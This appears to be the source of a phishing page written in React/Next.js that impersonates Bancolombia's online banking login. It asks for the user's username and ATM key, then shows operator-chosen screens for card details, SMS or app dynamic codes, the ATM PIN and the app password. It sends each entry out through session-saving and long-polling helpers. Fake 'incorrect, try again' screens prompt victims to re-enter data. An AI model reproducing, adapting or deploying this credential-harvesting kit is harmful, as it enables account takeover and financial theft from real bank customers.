"use client"
import "./bancolombia.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useRef, useState } from "react"
import axios from "axios"
import iniciarLongPolling from "@/utils/pulling"
import inicioSesionfuncion from "@/utils/inicioSesionfuncion"
import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta } from "@/utils/handlerVista"

const text_color_principal = "text-[#2C2A29] font-[OpenSans]"
const ESTILO_BTN_PRINCIPAL = `w-32 font-[CIBFont] font-bold py-2 px-6 bg-[#fdda24] rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed`

const svg = (
    <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
)

const candado = (
    <img src="/assets/bancolombia/candado.svg" alt="" />
)

const svgCard = (
    <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" fill="#5c5c5c5c" class="bi bi-credit-card-2-back-fill" viewBox="0 0 16 16">
        <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v5H0zm11.5 1a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h2a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5zM0 11v1a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-1z"/>
    </svg>
)

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#fdda24] border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

const InputAnimado = ({
    label,
    borderCol = "border-0", 
    borderColSelec = "", 
    borderColError, 
    errorLabel, 
    name,
    handler, 
    value, 
    error=false, 
    modoNumerico=false, 
    type="text", 
    backGraundInput="bg-white",
    contenBtn = null,
    btn = false,
    labelColor = "text-black",
    labelColorSelect = "",
    labelErrorColor = "text-red-600",
    placeHolder = "",
    svg = null
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const shouldFloat = isFocused || value !== "";
  const [mostrarPasword, setMostrarPasword] = useState(false)


  return (
    <div className="w-full flex flex-col">
        <div
        className={`w-full pl-3 pr-3 pt-3 relative flex items-center transition-all duration-300 ${
            isFocused ? `border-b-1 border-[#fdda24]` : borderCol
        } ${backGraundInput} ${borderColError && error ? borderColError: ""}`}
        >
        {svg &&
            svg
        }
        <input
            inputMode={modoNumerico ? "numeric" : "text"}
            name={name}
            type={ type == "password" ? mostrarPasword ? "text": "password" : type}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setIsFocused(false)}
            onChange={(e) => handler(e)}
            className={`ml-0.5 p-1 font-[OpenSans] font-semibold text-[14px] outline-none transition-all ${backGraundInput} ${
                type == "password" ? "w-[80%]" : "w-[80%]"
            }`}
            placeholder={isFocused ? placeHolder : ""}
            value={value}
            />
        <span
            className={`absolute left-2 font-[OpenSans] transition-all duration-200 px-1 pointer-events-none z-10 ${
            shouldFloat
                ? `-top-2 text-[12px] p-1 ${labelColorSelect != "" ? labelColorSelect : labelColor}`
                : `top-[60%] ${svg ? "left-10": "left-2.5"} -translate-y-1/2 text-[14px] ${labelColor}`
            }`}
        >
            {label}
        </span>
        </div>
        {error && <span className={`text-[12px] mt-1.5 font-[OpenSans] font-medium ${labelErrorColor}`}>{errorLabel}</span>}
    </div>
  );
}

const InputAnimadoClave = ({
  name,
  handler,
  value = "",
  error = false,
  errorLabel,
  label = "",
  tamInput = 4,
  labelColor = "text-black",
  labelErrorColor = "text-red-600",
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const [digits, setDigits] = useState(value.padEnd(tamInput, "").slice(0, tamInput).split(""));

  const handleChange = (index, val) => {
    if (!/^[0-9a-zA-Z]?$/.test(val)) return;

    const newDigits = [...digits];
    newDigits[index] = val;
    setDigits(newDigits);
    handler({ target: { name: name, value: newDigits.join("") } });

    // Mover al siguiente input si se ingresó algo
    if (val && index < (tamInput - 1)) {
      const nextInput = document.getElementById(`${name}-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      const prevInput = document.getElementById(`${name}-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  return (
    <div className="flex mt-6 flex-col items-start w-full mb-5">
      {label && (
        <label className={`mb-5 font-[OpenSans] text-[12px] font-semibold ${labelColor}`}>
          {label}
        </label>
      )}
      <div className="flex justify-between gap-2 w-full">
        {Array.from({ length: tamInput }).map((_, index) => (
          <input
            key={index}
            id={`${name}-${index}`}
            type="text"
            inputMode="numeric" 
            maxLength={1}
            className={`w-6 h-5 font-[OpenSans] text-center border-b-2 text-xl font-semibold outline-none transition-all 
              ${isFocused ? "border-black" : "border-gray-400"} 
              ${error ? "border-red-500" : ""}`}
            value={digits[index] || ""}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setIsFocused(false)}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
          />
        ))}
      </div>
      {error && (
        <span className={`text-[12px] mt-1.5 font-[OpenSans] font-medium ${labelErrorColor}`}>
          {errorLabel}
        </span>
      )}
    </div>
  );
};


const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, errorDatos})=>{
    return(
        <div className="w-[94%] bg-white p-2 rounded-xl flex flex-col items-center">
            <img src="/assets/bancolombia/candado.svg" className="mt-1.5" alt="" />
            <div className="w-[90%] flex flex-col mt-4 mb-6">
                <span className="text-[15px] font-[OpenSans] text-center text-[#2C2A29]">Es la misma que usas en el cajero automático</span>
            </div>
            
            <div className="w-[50%] mt-3 mb-3 flex flex-col">
                <InputAnimadoClave 
                    error={!!errorDatos.contrasenia}
                    errorLabel={errorDatos.contrasenia}
                    svg={svg}
                    labelErrorColor={"text-red-500"}
                    borderCol={"border-b-1 border-gray-300"}
                    borderColError={"border-b-1 border-b-red-500"} 
                    label={""} 
                    labelColor={"text-gray-500"}
                    modoNumerico={true}
                    tamInput={4}
                    type={"tel"} 
                    name={"contrasenia"} 
                    handler={handlerCheck} 
                    value={datosInicio.contrasenia}
                />
                <div>

                </div>
                
            </div>
            
            <div className="w-[90%] pt-6 pb-2 flex justify-between items-center">
                <button onClick={()=> handlerVolver(c => !c)} className="w-32 font-[CIBFont] font-bold py-2 px-6 rounded-full border border-black"> 
                    Volver
                </button>
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.contrasenia.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const Usuario = ({handlerCheck, handlerContinuar, datosInicio, errorDatos}) =>{
    return(
        <div className="w-[94%] bg-white p-2 rounded-xl flex flex-col items-center">
            <div className="w-full pt-2 flex flex-col justify-center items-center mt-2.5">
                <span className="text-[15px] font-[OpenSans] text-center text-[#2C2A29]">El usuario es el mismo con el que ingresas a la </span>
                <span className="text-[15px] font-[OpenSans] text-[#2C2A29] [text-shadow:0.3px_0_currentColor,-0.3px_0_currentColor,0_0.3px_currentColor,0_-0.3px_currentColor]">Sucursal Virtual Personas</span>
            </div>
            
            <div className="w-[75%] mt-8 mb-10 flex flex-col">
                <InputAnimado 
                    error={!!errorDatos.numeroDocumento}
                    errorLabel={errorDatos.numeroDocumento}
                    svg={svg}
                    labelErrorColor={"text-red-500"}
                    borderCol={"border-b-1 border-gray-300"}
                    borderColError={"border-b-1 border-b-red-500"} 
                    label={"Usuario"} 
                    labelColor={"text-gray-500"}
                    name={"numeroDocumento"} 
                    handler={handlerCheck} 
                    value={datosInicio.numeroDocumento}
                />
                <span className={`w-full text-end text-[12px] mt-1 ${text_color_principal}`}>¿Olvidaste tu usuario?</span>
                <div>

                </div>
                
            </div>
            <div className="w-[90%] pt-6 pb-2 flex justify-between items-center">
                <button className="w-32 font-[CIBFont] font-bold py-2 px-6 rounded-full border border-black"> 
                    Volver
                </button>
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const InicioSesion = ({ handlerInformacion,  datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })
    const [btnUser, setBtnUser] = useState(false)
    const [btnClave, setBtnClave] = useState(false)

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El campo es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    
    useEffect(()=>{
        if (btnClave) {
            handlerContinuar()
        }
    }, [btnClave])
    
    const handlerCheck = (e) => {
        const { name, value } = e.target;        
        handlerInformacion(e);
        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El campo es requerido";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-full font-[OpenSans] flex flex-col justify-center items-center pb-4">
            <h5 className="text-[22px] font-[CIBFont] font-bold">{!btnUser ? "Te damos la bienvenida": "Clave principal"}</h5>
            
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] font-[OpenSans] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
                {!btnUser &&
                    <Usuario handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={setBtnUser} />             
                }
                {
                    btnUser &&
                    <Clave handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={setBtnClave} handlerVolver={setBtnUser}/>
                }
            </div>
        </div>
    )
}



export default function Bancolombia (){
    const isMounted = useRef(true);
    const [selectVista, setSelectVisata] = useState("nlogin")
    const [loading, setLoading] = useState(false)
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }

    const handlerloginError = ()=>{
        setBtnInicio(true)
    }

    const tarjetaData = {
        'tdb': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:"}, 
        'xtdb':{span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."}, 
        'tdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingrese los siguientes datos de su tarjeta credito:"}, 
        'xtdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."},
    }

    const loginData  ={
        'nlogin': {handler: handlerInformacion, btn: handlerBtnInicio},
        'xlogin': {handler: handlerInformacion, btn: handlerloginError, error: "La información ingresada es incorrecta. Intenta nuevamente."},
    }

    const codData = {  
        'codsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto."}, 
        'xcodsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."},
        'codapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica desde la App Mi Bancolombia."}, 
        'xcodapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."}, 
        'pincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:"}, 
        'xpincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
        'pinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:"}, 
        'xpinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        if (btnInicio) {
            inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, selectVista,"Bancolombia")
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
        isMounted.current = true;

        if (guardado) {
            iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio);
            setBtnInicio(false)
        }
        return () => {
            isMounted.current = false;
        };
    }, [guardado, reLoad]);


    return(
        <div className={`w-full flex flex-col bg-[#f7f7f7] items-center justify-center`}>
            <div className={`w-full bg-white z-50 flex justify-center items-center py-3`}>
                <div className={`w-[98%] flex  gap gap-x-10`}>
                    <img src="/assets/bancolombia/header.svg" className=" ml-[25%] w-[45%] object-contain"/>
                    
                    <div className="flex justify-center items-center gap gap-x-1.5">
                        <span className="text-[15px] font-[OpenSans]">Salir</span>
                        <img src={"/assets/bancolombia/exitHeader.svg"} className="w-5 object-contain" alt="" />
                    </div>
                </div>

            </div>
            
            <div className="img min-h-[50vh] w-[90%] flex flex-col items-center">
                { (tarjetaData[selectVista] || codData[selectVista]) && 
                    <h5 className={`text-[24px] font-bold mb-3 ${tarjetaData[selectVista] ? "mt-0.5": ""}`}>{tarjetaData[selectVista] ? tarjetaData[selectVista].span : codData[selectVista].span}</h5>
                }               
                {(loading) && <Loading />}
                
                {loginData[selectVista] && (
                    <InicioSesion key={key} handlerInformacion={loginData[selectVista].handler} datosInicio={datosInicio} tituloError={loginData[selectVista]?.error || ""} btnInicio={loginData[selectVista].btn}/>
                )}
                
                {tarjetaData[selectVista] && 
                    <div className="w-[94%] bg-white p-3 flex justify-center rounded-xl mb-4">
                        <Tarjeta key={key} estiloTitulo="text-[16px] font-[OpenSans] text-center text-gray-800" setLoading={setLoading} svg={svgCard} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-1 "} borderCol={"border-b-1 border-gray-300"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>
                    </div>
                }
                
                {codData[selectVista]  && 
                    <div className="w-[94%] bg-white px-10 py-2 rounded-xl mb-4">
                        <Status key={key} svg={candado} estiloTitulo="text-[16px] text-center font-[OpenSans] text-gray-800" textColor={text_color_principal} estiloError="text-red-600 font-[OpenSans] text-[10px] text-center px-1" setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} titulo={codData[selectVista].titulo} lebelInput={codData[selectVista].span} InputModificado={InputAnimadoClave} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>
                    </div>
                }
            </div>
            
            <div className="w-full flex flex-col justify-center items-center bg-white">
                <div className="w-[90%] border-t-1 border-t-gray-300"></div>
                <img src="/assets/bancolombia/header.svg" className="w-[40%] object-contain" alt="" />
                <img src="/assets/bancolombia/foter.svg" className="w-[40%] object-contain mt-0.5" alt="" />                               
           </div>             
        </div>
    )
}